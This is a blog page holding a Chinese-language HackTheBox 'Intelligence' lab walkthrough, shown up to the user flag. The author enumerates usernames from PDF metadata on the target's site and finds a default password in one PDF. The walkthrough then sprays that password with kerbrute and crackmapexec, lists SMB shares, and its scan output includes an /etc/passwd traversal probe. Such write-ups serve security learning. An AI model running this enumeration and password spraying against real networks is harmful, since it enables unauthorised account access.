@@ -1,0 +1,741 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# Nmap 7.92SVN scan initiated Wed May 25 12:45:42 2022 as: nmap -sC -sV -Pn -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Intelligence">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Intelligence/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# Nmap 7.92SVN scan initiated Wed May 25 12:45:42 2022 as: nmap -sC -sV -Pn -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525131019783.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525131636159.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525131832119.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525131904466.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525132807357.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525171803861.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220525173058431.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.873Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:32.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220525131019783.png">
+  
+  
+  
+  <title>HackTheBox-Intelligence - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Intelligence"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          119 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Intelligence</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Wed May 25 12:45:42 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.248</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.248<br>Host is up (0.21s latency).<br>Not shown: 65516 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Intelligence<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-25 11:56:27Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:04+00:00; +6h59m59s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:03+00:00; +7h00m00s from scanner time.<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:05+00:00; +7h00m00s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: 2021-04-19T00:43:16<br>|_Not valid after:  2022-04-19T00:43:16<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-25T11:58:03+00:00; +7h00m00s from scanner time.<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49692/tcp open  msrpc         Microsoft Windows RPC<br>49702/tcp open  msrpc         Microsoft Windows RPC<br>49714/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-25T11:57:23<br>|_  start_date: N/A<br>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Wed May 25 12:58:08 2022 -- 1 IP address (1 host up) scanned in 746.51 seconds</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://intelligence.htb/<br>http://intelligence.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220525131019783.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525131019783"></p>
+<p>整个web页面什么都没有。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u http://intelligence.htb/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaic/.dirsearch/reports/intelligence.htb/-_22-05-25_13-11-13.txt<br><br>Error Log: /home/mosaic/.dirsearch/logs/errors-22-05-25_13-11-13.<span class="hljs-built_in">log</span><br><br>Target: http://intelligence.htb/<br><br>[13:11:14] Starting: <br>[13:11:18] 403 -  312B  - /%2e%2e//google.com<br>[13:11:39] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[13:12:12] 301 -  157B  - /documents  -&gt;  http://intelligence.htb/documents/<br>[13:12:22] 200 -    7KB - /index.html<br></code></pre></td></tr></table></figure>
+
+<p>似乎该站点的所有资源文件都放在/documents中，即使右键查看源码中的css样式与js：</p>
+<img src="https://www.worldisend.com/img/image-20220525131636159.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525131636159" style="zoom:200%;" />
+
+<p>包括页面中能够让我点击下载的按钮所跳转向的PDF：</p>
+<p><img src="https://www.worldisend.com/img/image-20220525131832119.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525131832119"></p>
+<p><img src="https://www.worldisend.com/img/image-20220525131904466.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525131904466"></p>
+<p>可以将其下载下来，查看他们的元属性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool 2020-01-01-upload.pdf <br>ExifTool Version Number         : 12.41<br>File Name                       : 2020-01-01-upload.pdf<br>Directory                       : .<br>File Size                       : 26 KiB<br>File Modification Date/Time     : 2021:04:02 01:00:00+08:00<br>File Access Date/Time           : 2022:05:25 13:21:23+08:00<br>File Inode Change Date/Time     : 2022:05:25 13:21:23+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.5<br>Linearized                      : No<br>Page Count                      : 1<br>Creator                         : William.Lee<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool 2020-12-15-upload.pdf <br>ExifTool Version Number         : 12.41<br>File Name                       : 2020-12-15-upload.pdf<br>Directory                       : .<br>File Size                       : 27 KiB<br>File Modification Date/Time     : 2021:04:02 01:00:00+08:00<br>File Access Date/Time           : 2022:05:25 13:21:41+08:00<br>File Inode Change Date/Time     : 2022:05:25 13:21:41+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.5<br>Linearized                      : No<br>Page Count                      : 1<br>Creator                         : Jose.Williams<br></code></pre></td></tr></table></figure>
+
+<p>一个是1月1号的，一个是十二月15号的，或许还会有其他PDF：</p>
+<p><img src="https://www.worldisend.com/img/image-20220525132807357.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220525132807357"></p>
+<p>看起来是的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta, date<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">daterange</span>(<span class="hljs-params">date1, date2</span>):<br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span> ((date2 - date1).days)+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">yield</span> date1 + timedelta(n)<br><br>start_dt = date(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>end_dt = date(<span class="hljs-number">2020</span>, <span class="hljs-number">12</span>, <span class="hljs-number">31</span>)<br><span class="hljs-keyword">for</span> dt <span class="hljs-keyword">in</span> daterange(start_dt, end_dt):<br>    <span class="hljs-built_in">print</span>(dt.strftime(<span class="hljs-string">&quot;%Y-%m-%d-upload.pdf&quot;</span>))<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ feroxbuster -w filepdf.txt -u http://intelligence.htb/documents/ -o result.txt<br></code></pre></td></tr></table></figure>
+
+<p>有很多很多PDF:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> result.txt                                <br>200      GET      126l      413w    11632c http://intelligence.htb/documents/2020-01-20-upload.pdf<br>200      GET      135l      429w    11557c http://intelligence.htb/documents/2020-01-23-upload.pdf<br>200      GET      195l      778w    27522c http://intelligence.htb/documents/2020-01-04-upload.pdf<br>200      GET      131l      410w    11228c http://intelligence.htb/documents/2020-02-17-upload.pdf<br>200      GET      130l      415w    11543c http://intelligence.htb/documents/2020-02-28-upload.pdf<br>200      GET      208l      768w    26835c http://intelligence.htb/documents/2020-01-01-upload.pdf<br>200      GET      192l      711w    26252c http://intelligence.htb/documents/2020-01-25-upload.pdf<br>&lt;skip&gt;..................<br></code></pre></td></tr></table></figure>
+
+<p>可以用awk处理一下并输出到wget.txt中去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> result.txt | awk <span class="hljs-string">&#x27;&#123; print $6 &#125;&#x27;</span> &gt; wget.txt<br></code></pre></td></tr></table></figure>
+
+<p>然后通过wget批量下载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wget -i wget.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool 2020-* |grep <span class="hljs-string">&quot;Creator&quot;</span> &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt                                   <br>Creator                         : William.Lee<br>Creator                         : William.Lee<br>Creator                         : Scott.Scott<br>Creator                         : Jason.Wright<br>Creator                         : Veronica.Patel<br>Creator                         : Jennifer.Thomas<br>Creator                         : Danny.Matthews<br>Creator                         : David.Reed<br>Creator                         : Stephanie.Young<br>Creator                         : Daniel.Shelton<br>&lt;skip&gt;...........................................<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> user.txt| awk <span class="hljs-string">&#x27;&#123; print $3&#125;&#x27;</span> &gt; newuser.txt<br></code></pre></td></tr></table></figure>
+
+<p>这样我就获取到一个用户名字典，获取PDF中也会保存有密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> *.pdf; <span class="hljs-keyword">do</span> pdftotext -layout <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>; <span class="hljs-keyword">done</span><br>$ grep -rl <span class="hljs-string">&quot;passwd&quot;</span> *.txt<br>$ grep -rl <span class="hljs-string">&quot;password&quot;</span> *.txt<br>2020-06-04-upload.txt<br>$ <span class="hljs-built_in">cat</span> 2020-06-04-upload.txt                <br>New Account Guide<br>Welcome to Intelligence Corp!<br>Please login using your username and the default password of:<br>NewIntelligenceCorpUser9876<br><br>After logging <span class="hljs-keyword">in</span> please change your password as soon as possible.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> NewIntelligenceCorpUser9876 &gt; passwd.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kerbrute userenum -d intelligence.htb newuser.txt --dc 10.10.10.248 -o exituser.txt<br>$ $ <span class="hljs-built_in">cat</span> exituser.txt|awk -F <span class="hljs-string">&#x27; |@&#x27;</span> <span class="hljs-string">&#x27;&#123;print $8&#125;&#x27;</span> &gt; exitsusers.txt<br>$ <span class="hljs-built_in">cat</span> exitsusers.txt                                    <br><br>William.Lee<br>Scott.Scott<br>Jennifer.Thomas<br>Jason.Wright<br>Veronica.Patel<br>Danny.Matthews<br>William.Lee<br>Daniel.Shelton<br>David.Reed<br>Stephanie.Young<br>John.Coleman<br>&lt;skip&gt;................................<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.248 -u exitsusers.txt -p passwd.txt --continue-on-success|grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 <br>[+] IP: 10.10.10.248:445	Name: intelligence.htb                                  <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	C$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	IT                                                	READ ONLY	<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	SYSVOL                                            	READ ONLY	Logon server share <br>	Users                                             	READ ONLY<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.248/Users -U Tiffany.Molina<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\Tiffany.Molina]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <br></code></pre></td></tr></table></figure>
+
+<p>看起来是把整个Users目录都共享了出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                  DR        0  Mon Apr 19 09:20:26 2021<br>  ..                                 DR        0  Mon Apr 19 09:20:26 2021<br>  Administrator                       D        0  Mon Apr 19 08:18:39 2021<br>  All Users                       DHSrn        0  Sat Sep 15 15:21:46 2018<br>  Default                           DHR        0  Mon Apr 19 10:17:40 2021<br>  Default User                    DHSrn        0  Sat Sep 15 15:21:46 2018<br>  desktop.ini                       AHS      174  Sat Sep 15 15:11:27 2018<br>  Public                             DR        0  Mon Apr 19 08:18:39 2021<br>  Ted.Graves                          D        0  Mon Apr 19 09:20:26 2021<br>  Tiffany.Molina                      D        0  Mon Apr 19 08:51:46 2021<br></code></pre></td></tr></table></figure>
+
+<p>在用户Tiffany.Molina 桌面可以捕捉到user.txt：</p>
